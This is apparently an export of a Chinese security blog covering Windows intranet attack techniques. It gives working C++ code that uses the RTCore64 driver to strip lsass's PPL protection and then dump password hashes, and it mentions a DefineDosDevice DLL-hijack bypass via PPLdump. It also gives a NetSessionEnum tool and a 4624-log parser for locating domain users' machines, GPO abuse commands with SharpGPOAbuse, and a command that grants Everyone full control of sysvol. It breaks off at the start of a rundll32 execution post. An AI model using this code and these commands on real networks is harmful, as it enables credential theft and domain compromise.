alt="img"></p><p>接着，在IDA中定位到数据所在的位置，可以看到是某行代码引用了这个值的硬编码</p><p><img src="1675575961067-09549000-8b37-4c66-b683-0a7cdc196946.png" alt="img"></p><p>在WinDbg中查看这段代码，能够识别到位于CcUnpinFileDataEx函数。那么，由于系统每次启动时基址是不固定的，因此这些值也不可能是固定的硬编码，肯定对这些值进行了修改，在需要使用时，可以通过固定的偏移量提取硬编码，从而得到页表基址，但要注意不同版本的内核文件的偏移量可能是不同的</p><p><img src="1675575986076-15534d12-5617-4c06-990c-09ba28b1df64.png" alt="img"></p><p>在不同版本的操作系统里面SignatureLevel在EPROCESS里面的偏移是不相同的，比如在2004里面位于0x878，而在1909版本则位于0x6f8，所以这里需要通过函数进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">struct Offsets getVersionOffsets() &#123;</span><br><span class="line">    wchar_t value[255] = &#123; 0x00 &#125;;</span><br><span class="line">    DWORD BufferSize = 255;</span><br><span class="line">    RegGetValue(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;, L&quot;ReleaseId&quot;, RRF_RT_REG_SZ, NULL, &amp;value, &amp;BufferSize);</span><br><span class="line">    wprintf(L&quot;[+] Windows Version %s Found\n&quot;, value);</span><br><span class="line">    auto winVer = _wtoi(value);</span><br><span class="line">    switch (winVer) &#123;</span><br><span class="line">    case 1607:</span><br><span class="line">        return Offsets&#123; 0x02e8, 0x02f0, 0x0358, 0x06c8 &#125;;</span><br><span class="line">    case 1803:</span><br><span class="line">    case 1809:</span><br><span class="line">        return Offsets&#123; 0x02e0, 0x02e8, 0x0358, 0x06c8 &#125;;</span><br><span class="line">    case 1903:</span><br><span class="line">    case 1909:</span><br><span class="line">        return Offsets&#123; 0x02e8, 0x02f0, 0x0360, 0x06f8 &#125;;</span><br><span class="line">    case 2004:</span><br><span class="line">    case 2009:</span><br><span class="line">        return Offsets&#123; 0x0440, 0x0448, 0x04b8, 0x0878 &#125;;</span><br><span class="line">    default:</span><br><span class="line">        wprintf(L&quot;[!] Version Offsets Not Found!\n&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后根据函数定位到PsInitialSystemProcess函数，从EnumDeviceDrivers可以得到内核基址，通过循环找到lsass进程，寻找偏移将SignatureLevel、SectionSignatureLevel、Level、Type、Audit和Signer这5个值清0即可绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">void disableProtectedProcesses(DWORD targetPID, Offsets offsets) &#123;</span><br><span class="line">    const auto Device = CreateFileW(LR&quot;(\\.\RTCore64)&quot;, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);</span><br><span class="line">    if (Device == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        Log(&quot;[!] Unable to obtain a handle to the device object&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Log(&quot;[*] Device object handle has been obtained&quot;);</span><br><span class="line"></span><br><span class="line">    const auto NtoskrnlBaseAddress = getKernelBaseAddr();</span><br><span class="line">    Log(&quot;[*] Ntoskrnl base address: %p&quot;, NtoskrnlBaseAddress);</span><br><span class="line"></span><br><span class="line">    HMODULE Ntoskrnl = LoadLibraryW(L&quot;ntoskrnl.exe&quot;);</span><br><span class="line">    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast&lt;DWORD64&gt;(GetProcAddress(Ntoskrnl, &quot;PsInitialSystemProcess&quot;)) - reinterpret_cast&lt;DWORD64&gt;(Ntoskrnl);</span><br><span class="line">    FreeLibrary(Ntoskrnl);</span><br><span class="line">    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);</span><br><span class="line">    Log(&quot;[*] PsInitialSystemProcess address: %p&quot;, PsInitialSystemProcessAddress);</span><br><span class="line"></span><br><span class="line">    const DWORD64 TargetProcessId = static_cast&lt;DWORD64&gt;(targetPID);</span><br><span class="line">    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;</span><br><span class="line">    DWORD64 CurrentProcessAddress = ProcessHead;</span><br><span class="line"></span><br><span class="line">    do &#123;</span><br><span class="line">        const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;</span><br><span class="line">        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UniqueProcessIdOffset);</span><br><span class="line">        if (UniqueProcessId == TargetProcessId) &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.ActiveProcessLinksOffset);</span><br><span class="line">    &#125; while (CurrentProcessAddress != ProcessHead);</span><br><span class="line">    CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;</span><br><span class="line">    Log(&quot;[*] Current process address: %p&quot;, CurrentProcessAddress);</span><br><span class="line"></span><br><span class="line">    WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);</span><br><span class="line"></span><br><span class="line">    // Cleanup</span><br><span class="line">    CloseHandle(Device);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在没有绕过LSA之前是不能够dump的，这里通过patch之后即可dump hash</p><p><img src="1675576058070-68dd4f74-581e-4187-aed4-9cf064a69876.png" alt="img"></p><h2 id="DefineDosDevice"><a href="#DefineDosDevice" class="headerlink" title="DefineDosDevice"></a>DefineDosDevice</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-definedosdevicew">https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-definedosdevicew</a></p><p>具体利用分析手法：</p><p><a href="https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html">https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html</a></p><p>如函数名所示，DefineDosDevice的作用是定义MS-DOS设备名称。根据官方文档，MS-DOS设备名是对象管理器中的符号链接，格式为\DosDevices\DEVICE_NAME。我们插入外部驱动器或者USB设备时就会出现这种情况，设备会被自动分配一个驱动器号，比如E:，我们可以调用QueryDosDevice来查询对应的映射。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL DefineDosDeviceW(</span><br><span class="line">  [in]           DWORD   dwFlags,</span><br><span class="line">  [in]           LPCWSTR lpDeviceName,</span><br><span class="line">  [in, optional] LPCWSTR lpTargetPath</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><img src="1675576128465-6886e540-9c4b-4b30-bbd6-54c1784de6ba.png" alt="img"></p><p>这里我们可以尝试使用QueryDosDevice来查询设备名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WCHAR path[MAX_PATH + 1];</span><br><span class="line">if (QueryDosDevice(argv[1], path, MAX_PATH)) </span><br><span class="line">&#123;</span><br><span class="line">    wprintf(L&quot;%ws -&gt; %ws\n&quot;, argv[1], path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="1675576175779-0fd9b552-e2c4-48ff-bb0c-0befeded5e07.png" alt="img"></p><p>但是在这个地方我们并不使用DefineDosDevice的常规功能，而是通过DefineDosDevice创建dll，因为PPL是不检查dll的数字签名的，从而实现dll劫持绕过PPL</p><p>使用到PPLdump项目编译，即可绕过并dump出hash</p><p><img src="1675576217018-af5b8dd0-3416-4020-ba47-cdf59194b8ab.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>域内定位个人PC</title>
      <link href="/2023/02/03/%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8D%E4%B8%AA%E4%BA%BAPC/"/>
      <url>/2023/02/03/%E5%9F%9F%E5%86%85%E5%AE%9A%E4%BD%8D%E4%B8%AA%E4%BA%BAPC/</url>
      
        <content type="html"><![CDATA[<hr><p>在域中，可以使用<code>query session</code>命令可以获得当前环境下的windows会话</p><p><img src="1675421655966-f4040b89-59a3-4344-8e82-7721ff4249d4.png" alt="img"></p><h1 id="1-NetSessionEnum"><a href="#1-NetSessionEnum" class="headerlink" title="1. NetSessionEnum"></a>1. NetSessionEnum</h1><h2 id="1-1-api介绍"><a href="#1-1-api介绍" class="headerlink" title="1.1. api介绍"></a>1.1. api介绍</h2><p>不需要高权限，不允许直接查询是谁登陆，允许查询是谁在访问此工作站的网络资源时所创建的网络会话，从这个网络会话中可以看到哪个域用户来自哪个 IP，并且该 API 不需要在远程主机上有管理员权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">NET_API_STATUS NET_API_FUNCTION NetSessionEnum(</span><br><span class="line">  [in]      LMSTR   servername, </span><br><span class="line">#servername指定一个远程的主机，然后这个 API 会去调用远程主机的 RPC，然后返回其他用户在访问这台远程主机的网络资源时所创建的网络会话，从而可以看到这个用户来自何处</span><br><span class="line">  [in]      LMSTR   UncClientName,</span><br><span class="line">  [in]      LMSTR   username,</span><br><span class="line">  [in]      DWORD   level,</span><br><span class="line">#level 的数值需要设置为10，是唯一以未经身份验证的方式就可以获取所需数据的级别</span><br><span class="line">  [out]     LPBYTE  *bufptr,</span><br><span class="line">  [in]      DWORD   prefmaxlen,</span><br><span class="line">  [out]     LPDWORD entriesread,</span><br><span class="line">  [out]     LPDWORD totalentries,</span><br><span class="line">  [in, out] LPDWORD resume_handle</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>返回<code>NERR_Success</code>和<code>ERROR_MORE_DATA</code>都是证明函数使用成功</p><p><img src="1675422086700-8790e551-9dd9-4e38-b6f0-beb379520fb4.png" alt="img"></p><h2 id="1-2-原理"><a href="#1-2-原理" class="headerlink" title="1.2. 原理"></a>1.2. 原理</h2><p>NetSessionEnum分为6步操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">与远程主机建立 SMB 连接（Kerberos 身份验证）</span><br><span class="line">连接到IPC$共享</span><br><span class="line">打开srvsvc命名管道</span><br><span class="line">srvsvc使用其 UUID绑定到接口4b324fc8-1670-01d3-1278-5a47bf6ee188</span><br><span class="line">查询NetSessionEnum</span><br><span class="line">关闭并注销</span><br></pre></td></tr></table></figure><p><img src="1675422302776-42187265-e692-4f90-b619-00796b6795af.png" alt="img"></p><h2 id="1-3-实现代码"><a href="#1-3-实现代码" class="headerlink" title="1.3.实现代码"></a>1.3.实现代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">// FindADPC.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="line">//</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#ifndef UNICODE</span><br><span class="line">#define UNICODE</span><br><span class="line">#endif</span><br><span class="line">#pragma comment(lib, &quot;Netapi32.lib&quot;)</span><br><span class="line">#pragma warning(disable:4996)</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line">#include &lt;windows.h&gt; </span><br><span class="line">#include &lt;lm.h&gt;</span><br><span class="line">#include &lt;ctime&gt;</span><br><span class="line"></span><br><span class="line">int session_enum(LPTSTR pszServerName) &#123;</span><br><span class="line">    NET_API_STATUS nStatus;</span><br><span class="line">    LPSESSION_INFO_10 pBuf = NULL;</span><br><span class="line">    LPSESSION_INFO_10 pTmpBuf;</span><br><span class="line">    DWORD dwLevel = 10;</span><br><span class="line">    DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;</span><br><span class="line">    DWORD dwEntriesRead = 0;</span><br><span class="line">    DWORD dwTotalEntries = 0;</span><br><span class="line">    DWORD dwResumeHandle = 0;</span><br><span class="line">    DWORD i;</span><br><span class="line">    DWORD dwTotalCount = 0;</span><br><span class="line">   </span><br><span class="line">    do </span><br><span class="line">    &#123;</span><br><span class="line">        nStatus = NetSessionEnum(pszServerName,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            dwLevel,</span><br><span class="line">            (LPBYTE*)&amp;pBuf,</span><br><span class="line">            dwPrefMaxLen,</span><br><span class="line">            &amp;dwEntriesRead,</span><br><span class="line">            &amp;dwTotalEntries,</span><br><span class="line">            &amp;dwResumeHandle);</span><br><span class="line"></span><br><span class="line">        if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))</span><br><span class="line">        &#123;</span><br><span class="line">            if ((pTmpBuf = pBuf) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              </span><br><span class="line">                for (i = 0; (i &lt; dwEntriesRead); i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    assert(pTmpBuf != NULL);</span><br><span class="line"></span><br><span class="line">                    if (pTmpBuf == NULL)</span><br><span class="line">                    &#123;</span><br><span class="line">                        fprintf(stderr, &quot;An access violation has occurred\n&quot;);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    SYSTEMTIME sys;</span><br><span class="line">                    GetLocalTime(&amp;sys);</span><br><span class="line">                    char current_time[64] = &#123; NULL &#125;;</span><br><span class="line">                    sprintf(current_time, &quot;%4d-%02d-%02d %02d:%02d:%02d &quot;, sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);</span><br><span class="line"></span><br><span class="line">                    printf(&quot;[%s]  [%ws]  [%ws]  [%ws]\n&quot;, current_time, pszServerName, pTmpBuf-&gt;sesi10_cname, pTmpBuf-&gt;sesi10_username);</span><br><span class="line">                   </span><br><span class="line">                    pTmpBuf++;</span><br><span class="line">                    dwTotalCount++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        else</span><br><span class="line">            fprintf(stderr, &quot;A system error has occurred: %d\n&quot;, nStatus);</span><br><span class="line">       </span><br><span class="line">        if (pBuf != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            NetApiBufferFree(pBuf);</span><br><span class="line">            pBuf = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;while (nStatus == ERROR_MORE_DATA); </span><br><span class="line"></span><br><span class="line">    if (pBuf != NULL)</span><br><span class="line">        NetApiBufferFree(pBuf);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int wmain(int argc, wchar_t* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    if (argc == 1) </span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;\nUsing:\n\t FindADPC.exe \\\\dc1 \n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (true)</span><br><span class="line">    &#123;</span><br><span class="line">        for (size_t i = 0; i &lt; argc; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (i == 0) </span><br><span class="line">            &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            session_enum(argv[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Sleep(5000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现截图</p><p><img src="1675422359955-28a3e235-84c7-4bef-907b-94683a076c90.png" alt="img"></p><h1 id="2-查询域控4624登录成功日志"><a href="#2-查询域控4624登录成功日志" class="headerlink" title="2.查询域控4624登录成功日志"></a>2.查询域控4624登录成功日志</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace EventLog4624</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            EventLog_4624();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static string MidStrEx(string sourse, string startstr, string endstr)</span><br><span class="line">        &#123;</span><br><span class="line">            string result = string.Empty;</span><br><span class="line">            int startindex, endindex;</span><br><span class="line">            startindex = sourse.IndexOf(startstr);</span><br><span class="line">            if (startindex == -1)</span><br><span class="line">                return result;</span><br><span class="line">            string tmpstr = sourse.Substring(startindex + startstr.Length);</span><br><span class="line">            endindex = tmpstr.IndexOf(endstr);</span><br><span class="line">            if (endindex == -1)</span><br><span class="line">                return result;</span><br><span class="line">            result = tmpstr.Remove(endindex);</span><br><span class="line"></span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void EventLog_4624()</span><br><span class="line">        &#123;</span><br><span class="line">            EventLog log = new EventLog(&quot;Security&quot;);</span><br><span class="line">            var entries = log.Entries.Cast&lt;EventLogEntry&gt;().Where(x =&gt; x.InstanceId == 4624);</span><br><span class="line">            entries.Select(x =&gt; new</span><br><span class="line">            &#123;</span><br><span class="line">                x.MachineName,</span><br><span class="line">                x.Site,</span><br><span class="line">                x.Source,</span><br><span class="line">                x.Message,</span><br><span class="line">                x.TimeGenerated</span><br><span class="line">            &#125;).ToList();</span><br><span class="line">            foreach (EventLogEntry log1 in entries)</span><br><span class="line">            &#123;</span><br><span class="line">                string text = log1.Message;</span><br><span class="line">                string ipaddress = MidStrEx(text, &quot; 源网络地址: &quot;, &quot; 源端口:&quot;);</span><br><span class="line">                string username = MidStrEx(text, &quot;新登录:&quot;, &quot;进程信息:&quot;);</span><br><span class="line">                username = MidStrEx(username, &quot; 帐户名:  &quot;, &quot; 帐户域:  &quot;);</span><br><span class="line">                DateTime Time = log1.TimeGenerated;</span><br><span class="line">                if (ipaddress.Length &gt;= 7)</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;\r\n-----------------------------------&quot;);</span><br><span class="line">                    Console.WriteLine(&quot;Time: &quot; + Time);</span><br><span class="line">                    Console.WriteLine(&quot;Username: &quot; + username.Replace(&quot;\n&quot;, &quot;&quot;).Replace(&quot; &quot;, &quot;&quot;).Replace(&quot;\t&quot;, &quot;&quot;).Replace(&quot;\r&quot;, &quot;&quot;));</span><br><span class="line">                    Console.WriteLine(&quot;Remote IP: &quot; + ipaddress.Replace(&quot;\n&quot;, &quot;&quot;).Replace(&quot; &quot;, &quot;&quot;).Replace(&quot;\t&quot;, &quot;&quot;).Replace(&quot;\r&quot;, &quot;&quot;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-gpo下发query-user写log到sysvol"><a href="#3-gpo下发query-user写log到sysvol" class="headerlink" title="3.gpo下发query user写log到sysvol"></a>3.gpo下发query user写log到sysvol</h1><h2 id="3-1-GPO介绍"><a href="#3-1-GPO介绍" class="headerlink" title="3.1.GPO介绍"></a>3.1.GPO介绍</h2><p>GPO（Group Policy Object）是 Windows 中的一种管理技术，用于管理域中用户和计算机的设置。通过 GPO，管理员可以下发策略来配置用户和计算机的系统设置，以实现统一的管理和控制。</p><p>在 GPO 管理环境下，管理员可以使用 query user 命令来查询当前连接到计算机的用户的信息。query user 命令可以查询用户的登录时间、登录状态、连接状态等信息。</p><p>管理员可以将 query user 命令的输出写入到 sysvol 目录中，以便对用户登录情况进行记录和统计。sysvol 目录是 Windows 中一个共享目录，用于存储域控制器上的组策略文件。管理员可以将 query user 命令的输出信息写入到 sysvol 目录中，以便通过域控制器来管理和访问这些信息。</p><h2 id="3-2-实现"><a href="#3-2-实现" class="headerlink" title="3.2.实现"></a>3.2.实现</h2><p>创建组策略</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module GroupPolicy;new-gpo -name QueryDomainUser01</span><br></pre></td></tr></table></figure><p><img src="1675422597092-682d3c35-8f6b-45a7-b70b-99d82dec9035.png" alt="img"></p><p>连接到域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Import-Module GroupPolicy;new-gplink -name QueryDomainUser01 -Target &quot;dc=god,dc=org&quot;</span><br></pre></td></tr></table></figure><p><img src="1675422649189-86e8d47f-1c19-45e3-8e6b-6ebf643cd072.png" alt="img"></p><p>修改sysvol的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls c:\windows\sysvol\ /grant Everyone:(OI)(CI)(F) /T</span><br></pre></td></tr></table></figure><p><img src="1675422682305-34680a29-9abf-4612-b0ec-547f19bd0f04.png" alt="img"></p><p><img src="1675422692371-6285bb73-1370-4bde-8f0c-4413aad3892b.png" alt="img"></p><p>下发执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpGPOAbuse.exe --AddComputerTask --TaskName &quot;QueryDomainUser001&quot; --Author owa\\administrator --Command &quot;cmd.exe&quot; --Arguments &quot;cmd /c query user &gt; \\owa\sysvol\%COMPUTERNAME%.txt&quot; --GPOName &quot;QueryDomainUser01&quot;</span><br></pre></td></tr></table></figure><p>强制执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><p><img src="1675422744578-5c117b46-b98a-46ff-b136-76c43cac1428.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>rundll32加载dll执行命令</title>
      <link href="/2022/09/21/rundll32%E5%8A%A0%E8%BD%BDdll%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/09/21/rundll32%E5%8A%A0%E8%BD%BDdll%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<hr><p><a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/">《Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement》</a>，介绍了利用rundll32.exe加载url.dll，通过导出函数OpenURL执行程序的方法。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="rundll32加载dll的用法"><a href="#rundll32加载dll的用法" class="headerlink" title="rundll32加载dll的用法"></a>rundll32加载dll的用法</h2><h3 id="1、rundll32加载dll的用法"><a href="#1、rundll32加载dll的用法" class="headerlink" title="1、rundll32加载dll的用法"></a>1、rundll32加载dll的用法</h3><p>官方文档：<a href="https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface">https://support.microsoft.com/sk-sk/help/164787/info-windows-rundll-and-rundll32-interface</a></p><p>用法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rundll32 &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;</span><br><span class="line"># 参数&lt;entrypoint&gt;代表传入dll的导出函数名，在dll中定义如下：</span><br><span class="line">#   <span class="keyword">void</span> CALLBACK <span class="title function_">EntryPoint</span><span class="params">(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, <span class="type">int</span> nCmdShow)</span>;</span><br><span class="line"># 参数&lt;optional arguments&gt;对应dll导出函数中的LPSTR lpszCmdLine，也就是说通过rundll32能控</span><br><span class="line"># 制dll导出函数的LPSTR lpszCmdLine参数</span><br></pre></td></tr></table></figure><h3 id="2、OpenURL的用法"><a href="#2、OpenURL的用法" class="headerlink" 